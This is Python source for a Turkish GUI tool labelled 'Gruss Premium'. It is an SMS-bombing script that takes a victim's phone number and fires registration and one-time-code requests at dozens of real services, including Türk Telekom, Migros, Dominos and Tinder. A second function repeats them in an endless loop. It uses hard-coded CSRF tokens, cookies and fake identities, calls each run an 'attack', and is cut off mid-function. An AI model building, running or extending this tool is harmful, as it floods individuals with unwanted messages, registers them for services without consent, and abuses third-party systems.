import tkinter
import customtkinter
import uuid
import bs4
import requests

customtkinter.set_appearance_mode("dark")  # Modes: system (default), light, dark
customtkinter.set_default_color_theme("dark-blue")  # Themes: blue (default), dark-blue, green
print(uuid.uuid4())
key = input("Anahtar Giriniz: ")
haceko = "batnet"

if key == haceko:
 print("Başarılı")
 app = customtkinter.CTk()
 app.iconbitmap
 app.title("Gruss Premium") # create CTk window like you do with the Tk window
 app.geometry("800x300")

 kaydir = customtkinter.CTkScrollableFrame(app, width=200,height=150)
 kaydir.pack()
 kaydir.place(relx=0.86, rely=0.50, anchor=tkinter.CENTER)

 phone = customtkinter.CTkEntry(master=app, placeholder_text="551 xxx xx xx")
 phone.pack(pady=12,padx=10)
 phone.place(relx=0.1, rely=0.2, anchor=tkinter.CENTER)

 text = customtkinter.CTkLabel(master=app, text="Telefon Numarası:")
 text.pack(pady=12,padx=10)
 text.place(relx=0.08, rely=0.1, anchor=tkinter.CENTER)

 texti = customtkinter.CTkLabel(master=app, text="Tekrarlı Saldırı Adeti:")
 texti.pack(pady=12,padx=10)
 texti.place(relx=0.085, rely=0.47, anchor=tkinter.CENTER)
 
 phonec = customtkinter.CTkEntry(master=app, placeholder_text="Tekrarlı Saldırı Adeti")
 phonec.pack(pady=12,padx=10)
 phonec.place(relx=0.1, rely=0.55, anchor=tkinter.CENTER)

 text2 = customtkinter.CTkLabel(master=app, text="Sonuç Tablosu:")
 text2.pack(pady=12,padx=10)
 text2.place(relx=0.78, rely=0.1, anchor=tkinter.CENTER)

 textx = customtkinter.CTkLabel(master=app, text="Gönderilecek Adet:")
 textx.pack(pady=12,padx=10)
 textx.place(relx=0.08, rely=0.3, anchor=tkinter.CENTER)

 combo = customtkinter.CTkComboBox(master=app,
                                  values=["40"])
 combo.grid(row=1, column=0, padx=20, pady=(10, 10))
 combo.place(relx=0.1, rely=0.38, anchor=tkinter.CENTER)


 def spammer():  
        try:    
            kahve_dunyasi = requests.post("https://ipapp.ipragaz.com.tr/login/register", json={

                "name": "doğukan yıldırım",
                "phone": phone.get(),
                "day": "15",
                "month": "3",
                "year": "2004",
                "carPlate": "12     asd     23454",
                "CSRFToken": "5f6973e0-8452-4506-bdfc-c85ba96100a4",
                "savePersonalData": "true"

            })
            print("[+]|KahveDünyası")
        except:    
            print("Unc") 
        try:    
            vakko = requests.post("https://www.vakko.com/users/register/", json={

                
  "email": "email1@gmail.com",
  "first_name": "DOĞUKAN",
  "last_name": "YILDIRIM",
  "date_of_birth": "2004-02-05",
  "password": "@Muratbey12345",
  "phone": "0"+phone.get(),
  "sms_allowed": "true",
  "email_allowed": "true",
  "gender": "male",
  "confirm": "true",
  "kvkk_confirm": "true",
  "call_allowed": "true"


            })
            print("[+]|VakkoPlus")
        except:    
            print("Unc") 
        try:    
            colm = requests.post("https://www.columbia.com.tr/api/customer/customerpolicy/setpermission", json={

                

  "firstName": "doğukan",
  "lastName": "yıldırım",
  "email": "email1@gmail.com",
  "phone": "0"+phone.get(),
  "smsPermission": "true",
  "emailPermission": "true",
  "SharePermission": "true",
  "KvkkPermission": "true",
  "CallPermission": "true",
  "IsConsentTextConfirmed": "true"


            })
            print("[+]|Collap")
        except:    
            print("Unc") 
        try:    
            ttkom = requests.post("https://onlineislemler.turktelekom.com.tr/oim/verification/otp/generate", json={
"msisdn": phone.get(),
"verificationOtpType": "NEW_SUBSCRIPTION_APPLICATION_MOBILE"
            })
            print("[+]|TürkTelekom")
        except:    
            print("Unc") 
        try:
          
          client=requests.session()
          login_page = client.get("https://www.derimod.com.tr/register/")
          login_page_html= bs4.BeautifulSoup(login_page.text, 'html.parser')
          token = login_page_html.find('input',{'name':'csrfmiddlewaretoken'}).get('value')
          response = requests.post("https://www.derimod.com.tr/users/registration/", data={
          "csrfmiddlewaretoken": token,
          "first_name": "doğukan",
          "last_name": "yıldırım",
          "email": "email1@gmail.com",
          "dob_day": "01",
          "dob_month": "02",
          "dob_year": "2006",
          "date_of_birth": "2006-02-01",
          "event_type": "register",
          "gender": "",
          "phone": "0"+phone.get(),
          "password": "Muratbaba123",
          "email_allowed": "true",
          "sms_allowed": "true",
          "confirm": "true",
          "add_loyalty": "true"
})
          print("[+]|Denos")
        except:
          print("Unc")
        try:
          
          client=requests.session()
          login_page = client.get("https://tr.uspoloassn.com/login/")
          login_page_html= bs4.BeautifulSoup(login_page.text, 'html.parser')
          token = login_page_html.find('input',{'name':'csrfmiddlewaretoken'}).get('value')
          response = requests.post("https://tr.uspoloassn.com/users/registration/", data={
          "csrfmiddlewaretoken": token,
          "first_name": "doğukan",
          "last_name": "yıldırım",
          "email": "email1@gmail.com",
          "phone": "0"+phone.get(),
          "password": "Muratbey123",
          "password2": "Muratbey123",
          "confirm": "true",
          "sms_allowed": "true",
          "email_allowed": "true"
})
          print("[+]|Denos")
        except:
          print("Unc")
        try:
          
          client=requests.session()
          login_page = client.get("https://www.pierrecardin.com.tr/login/")
          login_page_html= bs4.BeautifulSoup(login_page.text, 'html.parser')
          token = login_page_html.find('input',{'name':'csrfmiddlewaretoken'}).get('value')
          response = requests.post("https://www.pierrecardin.com.tr/users/registration/", data={
          "csrfmiddlewaretoken": token,
          "first_name": "doğukan",
          "last_name": "yıldırım",
          "email": "email1@gmail.com",
          "phone": "0"+phone.get(),
          "password": "Muratbey123",
          "password2": "Muratbey123",
          "confirm": "true",
          "sms_allowed": "true",
          "email_allowed": "true"
})
          print("[+]|Pieno")
        except:
          print("Unc")
        try:
          
          client=requests.session()
          login_page = client.get("https://www.cacharel.com.tr/login/")
          login_page_html= bs4.BeautifulSoup(login_page.text, 'html.parser')
          token = login_page_html.find('input',{'name':'csrfmiddlewaretoken'}).get('value')
          response = requests.post("https://www.cacharel.com.tr/users/registration/", data={
"csrfmiddlewaretoken": token,
"first_name": "doğukan",
"last_name": "yıldırım",
"email": "email1@gmail.com",
"phone": "0"+phone.get(),
"password": "Muratbey1234",
"password2": "Muratbey123",
"confirm": "true",
"sms_allowed": "true",
"email_allowed": "true"
})
          print("[+]|Chilon")
        except:
          print("Unc")
        try:
          
          client=requests.session()
          login_page = client.get("https://www.sportive.com.tr/login/")
          login_page_html= bs4.BeautifulSoup(login_page.text, 'html.parser')
          token = login_page_html.find('input',{'name':'csrfmiddlewaretoken'}).get('value')
          response = requests.post("https://www.sportive.com.tr/users/registration/", data={
"csrfmiddlewaretoken": token,
"first_name": "doğukan",
"last_name": "yıldırım",
"email": "email1@gmail.com",
"phone": "0"+phone.get(),
"password": "Muratbey1234",
"email_allowed": "true",
"sms_allowed": "true",
"contact_allowed": "true",
"confirm": "true",
"confirm-2": "true",
"next":"" 
})
          print("[+]|Sporty")
        except:
          print("Unc")
        try:
            json={"operationName": "GENERATE_OTP", 
                        "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", 
                        "variables": {"challenge": "f2523023-283e-46be-b8db-c08f27d3e21c", 
                                    "deviceUniqueId": "3D7C1B44-7F5D-44FC-B3F2-A1024B3AF6D3", 
                                    "phone": phone.get()
                                    }
                        }
            tiklagelsin = requests.post("https://svc.apps.tiklagelsin.com:443/user/graphql", json=json)
            print("[+]|TıklaGelsin")
        except:
            print("Unc")
        try:    
            kahve_dunyasi = requests.post("https://core.kahvedunyasi.com/api/users/sms/send", data={

                "mobile_number": phone.get(),

                "token_type": "register_token"

            })
            print("[+]|Leos")
        except:    
            print("Unc")
        try:    
            tefal = requests.post("https://www.tefal.com.tr/users/register/", json={

"email": "email1@gmail.com",
"first_name": "doğukan",
"last_name": "yıldırım",
"password": "Muratbey123",
"phone": "0"+phone.get(),
"confirm": "true",
"email_allowed": "true",
"sms_allowed": "true",
"date_of_birth": "1991-02-1"

            })
            print("[+]|Tiamot")
        except:    
            print("Unc")
        try:    
            macrocenter = requests.post("https://www.macrocenter.com.tr/rest/users/v2/register/otp?reid=1677", json={"email": "email1@gmail.com","phoneNumber": phone.get()
            })
            print("[+]|Macro")
        except:    
            print("Unc")
        try:
          ozel_api = requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",data={
            "phone_number" : "+90"+phone.get(),
            "headers":"{}",
        })
          print("[+]|UomilApi")
        except:
            print("Unc")
        try:
         url = "https://u.icq.net:443/api/v92/rapi/auth/sendCode"
         headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json", "Origin": "https://web.icq.com", "Dnt": "1", "Referer": "https://web.icq.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "cross-site", "Te": "trailers"}
         json={"params": {"application": "icq", "devId": "ic1rtwz1s1Hj1O0r", "language": "en-US", "phone": "90"+phone.get(), "route": "sms"}, "reqId": "25299-1669396271"}
         response=requests.post(url, headers=headers, json=json)
         print("[+]|İcq")
        except:
          print("Unc")
        try:
         url = "https://www.boyner.com.tr:443/v2/customerV2/Register"
         headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.boyner.com.tr/uyelik?type=uye-ol", "X-Newrelic-Id": "Vg8GVlZWCBACUFVRAwkEUFY=", "Newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI5MTcwNTAiLCJhcCI6IjMyMjUzNjA4MiIsImlkIjoiODE3YTIyZTZhODQ0OTJlNCIsInRyIjoiMTM0MWRkZThjZWVmMTExMjQ3MGE4NDQ2M2I1YWU4NzgiLCJ0aSI6MTY3MDU1MzA1OTMzNn19", "Traceparent": "00-1341dde8ceef1112470a84463b5ae878-817a22e6a84492e4-01", "Tracestate": "2917050@nr=0-1-2917050-322536082-817a22e6a84492e4----1670553059336", "Content-Type": "application/json;charset=utf-8", "Origin": "https://www.boyner.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
         json={"Captcha": "", "CaptchaTurn": False, "ConfirmNewPassword": "31ABC..abc31", "isGuestQuickBuy": "false", "Main": {"CellPhone": phone.get(), "day": "31", "Email": "email1@gmail.com", "FirstName": "Memati", "genderid": "1", "LastName": "Baş", "month": "12", "ReceiveCampaignMessages": True, "year": 1972}, "MembershipAgreement": True, "MembershipAgreementClone": True, "NewPassword": "31ABC..abc31", "ReturnUrl": "/"}
         response = requests.post(url, headers=headers, json=json)
         print("[+]|Boyn")
        except:
         print("Unc")
        try:
         response = requests.post('https://api.yaanimail.com:443/gateway/v1/accounts/verification-code/send', json = {"action": "create", "email": "asdardemeyenasdarolur19@yaani.com", "language": "tr", "recovery_options": [{"type": "email", "value": "asdardemeyenasdarolur19@yaani.com", "type": "msisdn", "value": "90"+phone.get()}]})
         print("[+]|Yaani")
        except:
         print("Unc")
        try:
         headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/116 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr"}
         response=requests.post('https://bineqapi.heymobility.tech:443/V2//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={num}', json = {"email":"jhrox@gmail.com","mobilePhone":phone.get(),"isSure":"false"},headers=headers)
         print("[+]|Bineq")
        except:
         print("Unc")
        try:
         response = requests.post('https://core.kahvedunyasi.com/api/users/sms/send', json = {"mobile_number": phone.get(),"token_type":"register_token"})
        except:
         print("Unc")
        try:
         response = requests.post('https://www.joker.com.tr/kullanici/ajax/check-sms', json = {"phone":"0"+phone.get()})
         print("[+]|Joker")
        except:
         print("Unc")
        try:
         response = requests.post('https://www.migros.com.tr/rest/users/login/otp', json = {"phoneNumber":phone.get()})
         print("[+]|Migros")
        except:
         print("Unc")
        try:
         response = requests.post('https://api2.e-bebek.com/ebebekwebservices/v2/ebebek/users/anonymous/validate?lang=tr&curr=TRY', json = {"email":"emai4l@gmail.com","emailAllow":"true","firstName":"Muhammer","kvkkAllow":"true","lastName":"Dere","password":"@!Derebey1234567","registerChannel":"","smsAllow":"true","uid":phone.get(),"userAgreement":"true"})
         print("[+]|Ebebek")
        except:
         print("Unc")
        try:
         response = requests.post('https://www.wmf.com.tr/users/register/', json = {"confirm":"true","date_of_birth":"2007-06-02","email":"email@gmail.com","email_allowed":"true","first_name":"Muhammer","gender":"male","last_name":"Dere","password":"Derebey123456","phone":"0"+phone.get(),"sms_allowed":"true"})
         print("[+]|WmfApi")
        except:
         print("Unc")
        try:
         response = requests.post('https://shop.naosstars.com/users/register/', json = {"email": "email@gmail.com","first_name": "Muhammer","last_name": "Dere","password": "Derebey123456","date_of_birth": "1952-02-08","phone": "0"+phone.get(),"gender": "male","kvkk": "true","contact": "true","confirm": "true"})
         print("[+]|Naos")
        except:
         print("Unc")
        try:
         response = requests.post('https://api.opet.com.tr/api/authentication/register', json = {"birthdate":"1999-02-12T22:00:00.000Z","commencisRadio":"true","email":"email@gmail.com","firstName":"Muhammer","googleRadio":"true","lastName":"Dere","microsoftRadio":"true","mobilePhone": phone.get(),"opetKvkkAndEtk":"true","plate":"34K8773"})
         print("[+]|Opet")
        except:
         print("Unc")
        try:
         response = requests.post('https://www.network.com.tr/otp/CreateOtp', data = {"PhoneNumber":phone.get(), "OtpType":"4"})
         print("[+]|Network")
        except:
         print("Unc")
        try:
         response = requests.post('https://frontend.dominos.com.tr/api/customer/sendOtpCode', json = {"mobilePhone":phone.get(), "email":"email@gmail.com"})
         print("[+]|Dominos")
        except:
         print("Unc")
        try:
         response = requests.post('https://www.dsmartgo.com.tr/web/account/checkphonenumber', data = {"__RequestVerificationToken": "bYFLKS9DehCBAb7l7KaI2WoTdtAJZya-AWsDTmHCl9FnEaUZiF2F1l3XkwppUyT0I3bXMUdUAruBUcqR8jVuLVsxPC41","IsSubscriber": "true","__reCAPTCHAVerificationToken": "03AGdBq26zV1jYt3RM1kdow0gpFcD7veljQAdV-0QoKLQIWi3voe27TlOwjbktguXtHgngHy13jsTzudfoNuLowIdqG1RcX4_XP5VoXy4un214kmTqChIDJPMKWvkUmLfXvWvXNTdajueI0T4zkdX2VGLz1Vn-uQxRRWxXjY81GZQlLUqu3oOSDYLBN2JH5DPh79Ms4BAxrTFC-ywWIWN1VVN5R2S6R6Ew7iyhDN_QQ1Ow5XcKuT7ycZbMrC_GUML5sKeDgoOtvm4pZ75LKX8ZArd9EPM783h0AXXVMedFGxa0V7a6_FocQ_7PRHeyOnku-HyoMgGZgB7cSIu6tPNddtYGLbOMGhR-2EyCtW4qKq1a9yceT-v7nequ9S0Cr-gYhb7DkjUyk56oUaZD6Za2NzqxIHPzfWC2M9x8WWeiWFqGSCHhjtL29UzGV8HH38X85BEpJKUVc_1U","Mobile": phone.get(),
                                                                                                   
         }, cookies={

        		"__RequestVerificationToken": "zavKdfCRqVPRUTX-52rcfG8yfGNVfs10gNOb5RIn16upRTctGH4nBp8ReSMxzZUN4cJQTcvY0b4uzP6AL0inDD_cFyA1",

        		"_ga": "GA1.3.1016548678.1638216163",

        		"_gat": "1",

        		"_gat_gtag_UA_18913632_14": "1",

        		"_gid": "GA1.3.1214889554.1638216163",

        		"ai_session": "lsdsMzMdX841eBwaKMxd8e|1638216163472|1638216163472",

        		"ai_user": "U+ClfGV5d2ZK1W1o19UNDn|2021-11-29T20:02:43.148Z"
         })
         print("[+]|Dsmart")
#DSMART SON <-!---------!->
        except:
         print("Unc")
        try:
         response = requests.post('https://www.a101.com.tr/users/otp-login/', data = {"phone":"0"+phone.get()})
         print("[+]|A101")
        except:
         print("Unc")
        try:
         response=requests.post('https://www.kigili.com/users/registration/', data = {"first_name": "Memati","last_name": "Bas","email": "email@gmail.com","phone": f"0{phone.get()}","password": "31ABC..abc31","confirm": "true","kvkk": "true","next": ""})
         print("[+]|Kiğili")
        except:
         print("Unc")
        try:
         response=requests.post('https://bim.veesk.net:443/service/v1.0/account/login', json = {"phone": phone.get()})
         print("[+]|Bim")
        except:
          print("Unc")
        try:
         response=requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data = {"phone_number":"+90"+phone.get(), "headers":"{}"})
         print("[+]|Gotİnd")
        except:
         print("Unc")
    #CEPTEŞOK
        try:
         response=requests.post('https://api.ceptesok.com:443/api/users/sendsms', json={"mobile_number": phone.get(), "token_type": "register_token"})
         print("[+]|Şok")
        except:
         print("Unc")
    #ENGLİSHHOME
        try:
         response=requests.post('https://www.englishhome.com:443/enh_app/users/registration/', data={"first_name": "Memati", "last_name": "Bas", "email": "email1@gmail.com", "phone": "0"+phone.get(), "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"})
         print("[+]|EnglishHome")
        except:
         print("Unc")
        try:
         response=requests.post('https://api.kunduz.com/auth/login/otp/', json = {"phone_number":{"country_code":1,"number":phone.get()}})
         print("[+]|Kunduz")
        except:
         print("Unc")
        try:
            r = requests.get(f"https://mopas.com.tr/sms/activation?mobileNumber={phone.get()}&pwd=&checkPwd=")
            print("[+]|Mopaş")
        except:
            print("Unc")
        try:
            url = "https://www.watsons.com.tr:443/api/v2/wtctr/phone-verification/phonenumber?lang=tr_TR"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0", "Accept": "application/json", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.watsons.com.tr/register", "Content-Type": "application/json;charset=UTF-8", "X-Dtpc": "11$208941126_619h150vEGITDHTLQJAGKPKRHUIMTILDMPAWJTOL-0e0", "Origin": "https://www.watsons.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Pragma": "no-cache", "Cache-Control": "no-cache", "Te": "trailers"}
            json={"countryCode": "TR", "phoneNumber": phone.get()}
            r = requests.post(url, headers=headers, json=json)
            print("[+]|Watsons")
        except:
            print("Unc")
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{phone.get()}"})
            print("[+]|KimGB")
        except:
            print("Unc")
        try:
            url = "https://apigw.ikinciyeni.com:443/RegisterRequest"
            json={"accounttype": 1, "email": "email1@gmail.com", "isAddPermission": True, "lastName": "Bas", "name": "Memati", "phone": phone.get()}
            r = requests.post(url, json=json)
            print("[+]|Ikı Yeni")
        except:
            print("Unc")
        try:
            url = "https://api.terrapizza.com.tr:443/api/v1/customers"
            json={"email": "email1@gmail.com", "emailPermitted": True, "kvkApproved": True, "name": "Memati", "phone": str(phone.get()), "smsPermitted": True, "surname": "Bas", "userAgreementApproved": True}
            r = requests.post(url,  json=json)
            print("[+]|TerraPizza")
        except:
            print("Unc")
        try:
            url = "https://42577.smartomato.ru/account/session"
            data={
              "g-recaptcha-response":"null",
              "phone":"90"+phone.get()}
            r = requests.post(url,  data=data)
            print("[+]|AutoSmart")
        except:
            print("Unc")

        verial=phone.get() + " [+]|BAŞARILI"
        yaziyaz=customtkinter.CTkLabel(kaydir, text=verial)
        yaziyaz.pack()
        print("[+]|Saldırı Tamamlandı")

def superspammer():  
    while True:
        try:    
            kahve_dunyasi = requests.post("https://ipapp.ipragaz.com.tr/login/register", json={

                "name": "doğukan yıldırım",
                "phone": phone.get(),
                "day": "15",
                "month": "3",
                "year": "2004",
                "carPlate": "12     asd     23454",
                "CSRFToken": "5f6973e0-8452-4506-bdfc-c85ba96100a4",
                "savePersonalData": "true"

            })
            print("[+]|KahveDünyası")
        except:    
            print("Unc") 
        try:    
            vakko = requests.post("https://www.vakko.com/users/register/", json={

                
  "email": "email1@gmail.com",
  "first_name": "DOĞUKAN",
  "last_name": "YILDIRIM",
  "date_of_birth": "2004-02-05",
  "password": "@Muratbey12345",
  "phone": "0"+phone.get(),
  "sms_allowed": "true",
  "email_allowed": "true",
  "gender": "male",
  "confirm": "true",
  "kvkk_confirm": "true",
  "call_allowed": "true"


            })
            print("[+]|VakkoPlus")
        except:    
            print("Unc") 
        try:    
            colm = requests.post("https://www.columbia.com.tr/api/customer/customerpolicy/setpermission", json={

                

  "firstName": "doğukan",
  "lastName": "yıldırım",
  "email": "email1@gmail.com",
  "phone": "0"+phone.get(),
  "smsPermission": "true",
  "emailPermission": "true",
  "SharePermission": "true",
  "KvkkPermission": "true",
  "CallPermission": "true",
  "IsConsentTextConfirmed": "true"


            })
            print("[+]|Collap")
        except:    
            print("Unc") 
        try:    
            ttkom = requests.post("https://onlineislemler.turktelekom.com.tr/oim/verification/otp/generate", json={
"msisdn": phone.get(),
"verificationOtpType": "NEW_SUBSCRIPTION_APPLICATION_MOBILE"
            })
            print("[+]|TürkTelekom")
        except:    
            print("Unc") 
        try:
          
          client=requests.session()
          login_page = client.get("https://www.derimod.com.tr/register/")
          login_page_html= bs4.BeautifulSoup(login_page.text, 'html.parser')
          token = login_page_html.find('input',{'name':'csrfmiddlewaretoken'}).get('value')
          response = requests.post("https://www.derimod.com.tr/users/registration/", data={
          "csrfmiddlewaretoken": token,
          "first_name": "doğukan",
          "last_name": "yıldırım",
          "email": "email1@gmail.com",
          "dob_day": "01",
          "dob_month": "02",
          "dob_year": "2006",
          "date_of_birth": "2006-02-01",
          "event_type": "register",
          "gender": "",
          "phone": "0"+phone.get(),
          "password": "Muratbaba123",
          "email_allowed": "true",
          "sms_allowed": "true",
          "confirm": "true",
          "add_loyalty": "true"
})
          print("[+]|Denos")
        except:
          print("Unc")
        try:
          
          client=requests.session()
          login_page = client.get("https://tr.uspoloassn.com/login/")
          login_page_html= bs4.BeautifulSoup(login_page.text, 'html.parser')
          token = login_page_html.find('input',{'name':'csrfmiddlewaretoken'}).get('value')
          response = requests.post("https://tr.uspoloassn.com/users/registration/", data={
          "csrfmiddlewaretoken": token,
          "first_name": "doğukan",
          "last_name": "yıldırım",
          "email": "email1@gmail.com",
          "phone": "0"+phone.get(),
          "password": "Muratbey123",
          "password2": "Muratbey123",
          "confirm": "true",
          "sms_allowed": "true",
          "email_allowed": "true"
})
          print("[+]|Denos")
        except:
          print("Unc")
        try:
          
          client=requests.session()
          login_page = client.get("https://www.pierrecardin.com.tr/login/")
          login_page_html= bs4.BeautifulSoup(login_page.text, 'html.parser')
          token = login_page_html.find('input',{'name':'csrfmiddlewaretoken'}).get('value')
          response = requests.post("https://www.pierrecardin.com.tr/users/registration/", data={
          "csrfmiddlewaretoken": token,
          "first_name": "doğukan",
          "last_name": "yıldırım",
          "email": "email1@gmail.com",
          "phone": "0"+phone.get(),
          "password": "Muratbey123",
          "password2": "Muratbey123",
          "confirm": "true",
          "sms_allowed": "true",
          "email_allowed": "true"
})
          print("[+]|Pieno")
        except:
          print("Unc")
        try:
          
          client=requests.session()
          login_page = client.get("https://www.cacharel.com.tr/login/")
          login_page_html= bs4.BeautifulSoup(login_page.text, 'html.parser')
          token = login_page_html.find('input',{'name':'csrfmiddlewaretoken'}).get('value')
          response = requests.post("https://www.cacharel.com.tr/users/registration/", data={
"csrfmiddlewaretoken": token,
"first_name": "doğukan",
"last_name": "yıldırım",
"email": "email1@gmail.com",
"phone": "0"+phone.get(),
"password": "Muratbey1234",
"password2": "Muratbey123",
"confirm": "true",
"sms_allowed": "true",
"email_allowed": "true"
})
          print("[+]|Chilon")
        except:
          print("Unc")
        try:
          
          client=requests.session()
          login_page = client.get("https://www.sportive.com.tr/login/")
          login_page_html= bs4.BeautifulSoup(login_page.text, 'html.parser')
          token = login_page_html.find('input',{'name':'csrfmiddlewaretoken'}).get('value')
          response = requests.post("https://www.sportive.com.tr/users/registration/", data={
"csrfmiddlewaretoken": token,
"first_name": "doğukan",
"last_name": "yıldırım",
"email": "email1@gmail.com",
"phone": "0"+phone.get(),
"password": "Muratbey1234",
"email_allowed": "true",
"sms_allowed": "true",
"contact_allowed": "true",
"confirm": "true",
"confirm-2": "true",
"next":"" 
})
          print("[+]|Sporty")
        except:
          print("Unc")
        try:
            json={"operationName": "GENERATE_OTP", 
                        "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", 
                        "variables": {"challenge": "f2523023-283e-46be-b8db-c08f27d3e21c", 
                                    "deviceUniqueId": "3D7C1B44-7F5D-44FC-B3F2-A1024B3AF6D3", 
                                    "phone": phone.get()
                                    }
                        }
            tiklagelsin = requests.post("https://svc.apps.tiklagelsin.com:443/user/graphql", json=json)
            print("[+]|TıklaGelsin")
        except:
            print("Unc")
        try:    
            kahve_dunyasi = requests.post("https://core.kahvedunyasi.com/api/users/sms/send", data={

                "mobile_number": phone.get(),

                "token_type": "register_token"

            })
            print("[+]|Leos")
        except:    
            print("Unc")
        try:    
            tefal = requests.post("https://www.tefal.com.tr/users/register/", json={

"email": "email1@gmail.com",
"first_name": "doğukan",
"last_name": "yıldırım",
"password": "Muratbey123",
"phone": "0"+phone.get(),
"confirm": "true",
"email_allowed": "true",
"sms_allowed": "true",
"date_of_birth": "1991-02-1"

            })
            print("[+]|Tiamot")
        except:    
            print("Unc")
        try:    
            macrocenter = requests.post("https://www.macrocenter.com.tr/rest/users/v2/register/otp?reid=1677", json={"email": "email1@gmail.com","phoneNumber": phone.get()
            })
            print("[+]|Macro")
        except:    
            print("Unc")
        try:
          ozel_api = requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",data={
            "phone_number" : "+90"+phone.get(),
            "headers":"{}",
        })
          print("[+]|UomilApi")
        except:
            print("Unc")
        try:
         url = "https://u.icq.net:443/api/v92/rapi/auth/sendCode"
         headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json", "Origin": "https://web.icq.com", "Dnt": "1", "Referer": "https://web.icq.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "cross-site", "Te": "trailers"}
         json={"params": {"application": "icq", "devId": "ic1rtwz1s1Hj1O0r", "language": "en-US", "phone": "90"+phone.get(), "route": "sms"}, "reqId": "25299-1669396271"}
         response=requests.post(url, headers=headers, json=json)
         print("[+]|İcq")
        except:
          print("Unc")
        try:
         url = "https://www.boyner.com.tr:443/v2/customerV2/Register"
         headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.boyner.com.tr/uyelik?type=uye-ol", "X-Newrelic-Id": "Vg8GVlZWCBACUFVRAwkEUFY=", "Newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI5MTcwNTAiLCJhcCI6IjMyMjUzNjA4MiIsImlkIjoiODE3YTIyZTZhODQ0OTJlNCIsInRyIjoiMTM0MWRkZThjZWVmMTExMjQ3MGE4NDQ2M2I1YWU4NzgiLCJ0aSI6MTY3MDU1MzA1OTMzNn19", "Traceparent": "00-1341dde8ceef1112470a84463b5ae878-817a22e6a84492e4-01", "Tracestate": "2917050@nr=0-1-2917050-322536082-817a22e6a84492e4----1670553059336", "Content-Type": "application/json;charset=utf-8", "Origin": "https://www.boyner.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
         json={"Captcha": "", "CaptchaTurn": False, "ConfirmNewPassword": "31ABC..abc31", "isGuestQuickBuy": "false", "Main": {"CellPhone": phone.get(), "day": "31", "Email": "email1@gmail.com", "FirstName": "Memati", "genderid": "1", "LastName": "Baş", "month": "12", "ReceiveCampaignMessages": True, "year": 1972}, "MembershipAgreement": True, "MembershipAgreementClone": True, "NewPassword": "31ABC..abc31", "ReturnUrl": "/"}
         response = requests.post(url, headers=headers, json=json)
         print("[+]|Boyn")
        except:
         print("Unc")
        try:
         response = requests.post('https://api.yaanimail.com:443/gateway/v1/accounts/verification-code/send', json = {"action": "create", "email": "asdardemeyenasdarolur19@yaani.com", "language": "tr", "recovery_options": [{"type": "email", "value": "asdardemeyenasdarolur19@yaani.com", "type": "msisdn", "value": "90"+phone.get()}]})
         print("[+]|Yaani")
        except:
         print("Unc")
        try:
         headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/116 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr"}
         response=requests.post('https://bineqapi.heymobility.tech:443/V2//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={num}', json = {"email":"jhrox@gmail.com","mobilePhone":phone.get(),"isSure":"false"},headers=headers)
         print("[+]|Bineq")
        except:
         print("Unc")
        try:
